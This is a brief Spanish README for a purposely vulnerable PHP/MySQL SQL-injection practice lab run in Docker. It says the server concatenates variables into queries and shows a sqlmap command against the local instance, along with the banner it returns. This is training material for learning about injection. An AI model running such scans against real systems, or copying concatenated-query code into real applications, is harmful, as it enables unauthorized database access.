# SQL Injection

Descargar y Montar el servidor desde Docker usando un volumen con el Codigo Fuente de Github para editarlo:

```bash
git clone https://github.com/IngenieroRicardo/SQLInjection
docker pull ghcr.io/ingenieroricardo/sqlinjection:latest
docker run --publish 8080:80 -v ./SQLInjection:/app ghcr.io/ingenieroricardo/sqlinjection:latest
```

<hr>

Al tener las variables concatenadas puedes hacer inyeccion SQL:

```bash
sqlmap -u "http://127.0.0.1:8080/servidor.php?nombre=yo&mensaje=hola" -b

5.5.62-0ubuntu0.14.04.1-log
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12
banner: '5.5.62-0ubuntu0.14.04.1-log'
```
